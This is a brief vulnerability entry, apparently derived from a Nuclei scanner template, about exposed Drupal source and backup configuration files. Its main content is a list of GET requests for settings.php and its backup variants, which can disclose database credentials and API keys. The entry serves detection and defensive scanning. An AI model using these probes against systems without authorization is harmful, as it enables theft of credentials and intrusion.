# Vulnerability: Drupal - Source Code Disclosure
**Classification:** DRUPAL
**Source:** Nuclei Template (`drupal-source-code-disclosure.yaml`)

## Description
Detected exposed Drupal source code, backup files, and sensitive configurations, potentially disclosing database credentials and API keys. This exposure revealed internal system paths and critical site metadata, increasing the risk of full system compromise.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/sites/default/settings.php
GET {{BaseURL}}/sites/default/settings.php~
GET {{BaseURL}}/sites/default/settings.php.bak
GET {{BaseURL}}/sites/default/settings.php.old
GET {{BaseURL}}/sites/default/settings.php.orig
GET {{BaseURL}}/sites/default/settings.php.save
GET {{BaseURL}}/sites/default/settings.php.swp
GET {{BaseURL}}/sites/default/settings.local.php
```

